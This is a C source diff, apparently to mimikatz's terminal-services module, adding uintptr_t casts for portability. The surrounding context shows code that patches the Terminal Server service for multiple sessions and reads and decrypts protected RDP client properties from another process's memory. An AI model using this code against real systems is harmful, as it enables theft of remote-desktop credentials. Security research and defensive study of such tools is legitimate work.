@@ -5,6 +5,8 @@
 */
 #include "kuhl_m_ts.h"
 
+#include <inttypes.h>
+
 const KUHL_M_C kuhl_m_c_ts[] = {
 	{kuhl_m_ts_multirdp,	L"multirdp",	L"[experimental] patch Terminal Server service to allow multiples users"},
 	{kuhl_m_ts_sessions,	L"sessions",	NULL},
@@ -477,15 +479,15 @@ void kuhl_m_ts_mstsc_MemoryAnalysis_property(PKULL_M_MEMORY_HANDLE hMemory, PVOI
 							switch(pProperties[i].dwType)
 							{
 							case 1:
-								kprintf(L"[ dword ] %u (0x%08x)", (DWORD) pProperties[i].pvData, (DWORD) pProperties[i].pvData);
+								kprintf(L"[ dword ] %u (0x%08x)", (DWORD)(uintptr_t) pProperties[i].pvData, (DWORD)(uintptr_t)pProperties[i].pvData);
 								break;
 
 							case 2:
-								kprintf(L"[ word? ] %u (0x%04x)", (WORD) pProperties[i].pvData, (WORD) pProperties[i].pvData);
+								kprintf(L"[ word? ] %u (0x%04x)", (WORD)(uintptr_t) pProperties[i].pvData, (WORD) pProperties[i].pvData);
 								break;
 
 							case 3:
-								kprintf(L"[ bool  ] %s", ((BOOL) pProperties[i].pvData) ? L"TRUE" : L"FALSE");
+								kprintf(L"[ bool  ] %s", ((BOOL)(uintptr_t) pProperties[i].pvData) ? L"TRUE" : L"FALSE");
 								break;
 
 							case 4:
@@ -501,18 +503,18 @@ void kuhl_m_ts_mstsc_MemoryAnalysis_property(PKULL_M_MEMORY_HANDLE hMemory, PVOI
 
 							case 6:
 								kprintf(L"[protect] ");
-								if(pProperties[i].pvData && (DWORD) pProperties[i].unkp2)
+								if(pProperties[i].pvData && (DWORD)(uintptr_t)pProperties[i].unkp2)
 								{
-									aDataBuffer.address = (PBYTE) LocalAlloc(LPTR, (DWORD) pProperties[i].unkp2);
+									aDataBuffer.address = (PBYTE) LocalAlloc(LPTR, (DWORD)(uintptr_t) pProperties[i].unkp2);
 
 									if(aDataBuffer.address)
 									{
 										aProcess.address = pProperties[i].pvData;
-										if(kull_m_memory_copy(&aDataBuffer, &aProcess, (DWORD) pProperties[i].unkp2))
+										if(kull_m_memory_copy(&aDataBuffer, &aProcess, (DWORD)(uintptr_t) pProperties[i].unkp2))
 										{
 											if(pProperties[i].dwFlags & 0x800)
 											{
-												if(kull_m_crypto_remote_CryptUnprotectMemory(aProcess.hMemory, aDataBuffer.address, (DWORD) pProperties[i].unkp2, CRYPTPROTECTMEMORY_SAME_PROCESS))
+												if(kull_m_crypto_remote_CryptUnprotectMemory(aProcess.hMemory, aDataBuffer.address, (DWORD)(uintptr_t) pProperties[i].unkp2, CRYPTPROTECTMEMORY_SAME_PROCESS))
 												{
 													kprintf(L"\'%.*s\'", *(PDWORD) aDataBuffer.address / sizeof(wchar_t), ((PBYTE) aDataBuffer.address) + sizeof(DWORD));
 												}
@@ -520,7 +522,7 @@ void kuhl_m_ts_mstsc_MemoryAnalysis_property(PKULL_M_MEMORY_HANDLE hMemory, PVOI
 											}
 											else
 											{
-												kull_m_string_wprintf_hex(aDataBuffer.address, (DWORD) pProperties[i].unkp2, 0);
+												kull_m_string_wprintf_hex(aDataBuffer.address, (DWORD)(uintptr_t) pProperties[i].unkp2, 0);
 											}
 										}
 										LocalFree(aDataBuffer.address);
